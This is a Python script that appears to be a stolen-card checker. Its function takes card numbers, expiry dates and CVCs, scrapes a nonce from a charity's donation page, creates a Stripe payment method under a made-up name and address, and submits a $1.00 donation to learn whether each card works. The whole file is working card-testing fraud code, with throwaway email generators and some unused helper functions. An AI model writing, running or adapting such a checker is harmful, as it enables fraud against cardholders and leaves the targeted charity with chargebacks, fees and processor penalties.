import requests
from bs4 import BeautifulSoup
import random
import string
def find_between(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"
def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"

def generate_username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

async def main():
    user = generate_user_agent()
    acc = generate_random_account()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
user = "cristniki" + str(random.randint(9999, 574545))
mail = "cristniki" + str(random.randint(9999, 574545))+"@gmail.com"







def Tele(ccx):
    import requests
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    response = requests.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
    nonce = gets(response.text, '<input type="hidden" name="_charitable_donation_nonce" value="', '"  />')
    # print(nonce)

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'dnt': '1',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    data = {
        'type': 'card',
        'billing_details[name]': 'mike edwin',
        'billing_details[email]': mail,
        'billing_details[address][city]': 'New York',
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': '4863 lovers ln',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][state]': 'NEW YORK',
        'billing_details[phone]': '+1 986-543-6546',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
        'muid': '684e06cf-094d-4f66-92e0-5c2834e67838ba74d5',
        'sid': 'f2477404-fcfc-4b5c-908c-8552d9c8a82c525f99',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/d16ff171ee; stripe-js-v3/d16ff171ee; card-element',
        'referrer': 'https://needhelped.com',
        'time_on_page': '360620',
        'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
    }

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json()['id']
    # print(id)

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://needhelped.com',
        'priority': 'u=1, i',
        'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'charitable_form_id': '68590dfb4441c',
        '68590dfb4441c': '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
        'campaign_id': '1164',
        'description': 'Poor Children Donation Support',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': '1.00',
        'first_name': 'MIKE',
        'last_name': 'EDWIN',
        'email': mail,
        'address': '4863 lovers ln',
        'address_2': '',
        'city': 'New York',
        'state': 'NEW YORK',
        'postcode': '10080',
        'country': 'US',
        'phone': '+1 986-543-6546',
        'gateway': 'stripe',
        'stripe_payment_method': id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    response = requests.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    print(response.text)

    try:
        json_data = response.json()
        print(f"DEBUG: JSON Response: {json_data}")  # Debug print
        if 'errors' in json_data:
            # Return the first error message as a string
            if isinstance(json_data['errors'], list) and len(json_data['errors']) > 0:
                error_msg = json_data['errors'][0]
                print(f"DEBUG: Returning error: {error_msg}")  # Debug print
                return error_msg
            else:
                error_msg = str(json_data['errors'])
                print(f"DEBUG: Returning error: {error_msg}")  # Debug print
                return error_msg
        else:
            print("DEBUG: Returning succeeded")  # Debug print
            return "succeeded"
    except ValueError:
        print(f"DEBUG: ValueError - {response.text}")  # Debug print
        return "❌ Invalid JSON Response"
    except Exception as e:
        print(f"DEBUG: Exception - {str(e)}")  # Debug print
        return f"❌ Error: {str(e)}"